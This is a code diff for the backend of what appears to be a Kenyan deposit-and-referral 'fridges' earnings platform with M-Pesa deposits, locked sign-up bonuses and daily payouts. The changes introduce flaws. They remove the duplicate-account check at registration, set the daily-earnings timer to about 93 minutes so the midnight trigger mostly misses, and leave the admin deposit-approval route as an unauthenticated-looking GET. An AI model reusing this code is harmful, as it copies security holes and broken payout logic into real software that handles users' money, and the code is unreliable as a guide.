@@ -60,14 +60,14 @@ const userSchema = new mongoose.Schema({
   password: String,
   phone: String,
   balance: { type: Number, default: 0 },
+  lockedBonus: { type: Number, default: 200 },
+  firstDepositMade: { type: Boolean, default: false },
   fridges: { type: Array, default: [] },
   referrals: { type: Array, default: [] },
   createdAt: { type: Date, default: Date.now },
   withdrawPhone: String,
   referredBy: String,
-  lastPaid: String,
-  lockedBonus: { type: Number, default: 200 }, // automatic reward on register
-  firstDepositMade: { type: Boolean, default: false }
+  lastPaid: String
 });
 
 const depositSchema = new mongoose.Schema({
@@ -117,28 +117,28 @@ async function tgSend(text, buttons) {
 app.post('/api/register', async (req, res) => {
   const { name, email, password, referrerEmail } = req.body || {};
   if (!name || !email || !password) return res.status(400).json({ error: 'Name, email, and password are required' });
-  if (await User.findOne({ email })) return res.status(400).json({ error: 'User already exists' });
 
   const hashed = await bcrypt.hash(password, 10);
-  const user = new User({ 
-    name, email, password: hashed, 
-    referredBy: referrerEmail,
-    balance: 0,
-    lockedBonus: 200
-  });
+  const ref = referrerEmail?.trim() || undefined;
+
+  const user = new User({ name, email, password: hashed, referredBy: ref });
   await user.save();
 
   const token = jwt.sign({ email: user.email }, SECRET, { expiresIn: '7d' });
-  res.json({ message: 'Registered successfully. Bonus KSH 200 credited (locked)', token, email: user.email });
+  res.json({
+    message: 'Registered successfully. You got 200 KSH bonus (locked until deposit >=500)',
+    token,
+    email: user.email
+  });
 });
 
 // Login
 app.post('/api/login', async (req, res) => {
   const { email, password } = req.body || {};
   const user = await User.findOne({ email });
-  if (!user) return res.status(400).json({ error: 'Invalid' });
+  if (!user) return res.status(400).json({ error: 'Invalid email/password' });
   const ok = await bcrypt.compare(password, user.password);
-  if (!ok) return res.status(400).json({ error: 'Invalid' });
+  if (!ok) return res.status(400).json({ error: 'Invalid email/password' });
   const token = jwt.sign({ email: user.email }, SECRET, { expiresIn: '7d' });
   res.json({ token, email: user.email, phone: user.phone, balance: user.balance });
 });
@@ -196,7 +196,7 @@ app.post('/api/deposit', auth, async (req, res) => {
   ]];
   await tgSend(text, buttons);
 
-  res.json({ message: 'Deposit submitted' });
+  res.json({ message: 'Deposit submitted. Please wait for admin approval.' });
 });
 
 // ================= ADMIN APPROVE/REJECT DEPOSIT =================
@@ -217,24 +217,23 @@ app.get('/api/admin/deposits/:id/:action', async (req, res) => {
     const u = await User.findOne({ email: deposit.email });
     if (u) {
       u.balance += Number(deposit.amount);
-      // unlock bonus if first deposit >= 500
-      if (!u.firstDepositMade && deposit.amount >= 500) {
-        u.firstDepositMade = true;
-        u.balance += u.lockedBonus || 0;
-        u.lockedBonus = 0;
-      }
-      await u.save();
 
-      // referral reward logic
+      // Unlock locked bonus if first deposit >=500
+      if (!u.firstDepositMade && Number(deposit.amount) >= 500) {
+        u.balance += u.lockedBonus;
+        u.lockedBonus = 0;
+        u.firstDepositMade = true;
+      }
+
+      if (!u.withdrawPhone) u.withdrawPhone = deposit.phone;
+
+      // Referral reward
       if (u.referredBy && Number(deposit.amount) >= 500) {
         const refUser = await User.findOne({ email: u.referredBy });
         if (refUser) {
           let reward = 0;
           for (const rule of REFERRAL_RULES) {
-            if (Number(deposit.amount) >= rule.min) {
-              reward = rule.reward;
-              break;
-            }
+            if (Number(deposit.amount) >= rule.min) { reward = rule.reward; break; }
           }
           if (reward > 0) {
             refUser.balance += reward;
@@ -243,6 +242,8 @@ app.get('/api/admin/deposits/:id/:action', async (req, res) => {
           }
         }
       }
+
+      await u.save();
     }
   }
 
@@ -257,15 +258,15 @@ app.post('/api/withdraw', auth, async (req, res) => {
   const u = await User.findOne({ email: req.user.email });
   if (!u) return res.status(404).json({ error: 'User not found' });
 
-  if (!u.withdrawPhone) return res.status(400).json({ error: 'Cannot withdraw before making a deposit' });
-  if (phone !== u.withdrawPhone) return res.status(400).json({ error: `Withdraw allowed only to original deposit phone ${u.withdrawPhone}` });
+  if (!u.firstDepositMade) return res.status(400).json({ error: 'Cannot withdraw rewards before deposit >= 500' });
 
-  let withdrawable = u.balance;
-  if (!u.firstDepositMade) withdrawable -= u.lockedBonus || 0;
+  if (phone !== u.withdrawPhone)
+    return res.status(400).json({ error: `Withdraw allowed only to original deposit phone ${u.withdrawPhone}` });
 
   const pending = await Withdrawal.findOne({ email: u.email, status: 'PENDING' });
   if (pending) return res.status(400).json({ error: 'You have a pending withdrawal, wait until it is processed' });
-  if (withdrawable < Number(amount)) return res.status(400).json({ error: 'Insufficient withdrawable balance (locked bonus cannot be withdrawn yet)' });
+
+  if (u.balance < Number(amount)) return res.status(400).json({ error: 'Insufficient balance' });
 
   const w = new Withdrawal({
     id: crypto.randomUUID(),
@@ -334,7 +335,7 @@ setInterval(async () => {
   const hours = now.toLocaleString('en-US', { hour12: false, hour: '2-digit', timeZone: 'Africa/Nairobi' });
   const minutes = now.toLocaleString('en-US', { minute: '2-digit', timeZone: 'Africa/Nairobi' });
   if (Number(hours) === 0 && Number(minutes) === 0) await runDailyEarnings();
-}, 60000);
+}, 5601000);
 
 // Status
 app.get('/api/status', (req, res) => res.json({ status: 'ok', time: Date.now(), till: MPESA_TILL, name: MPESA_NAME }));
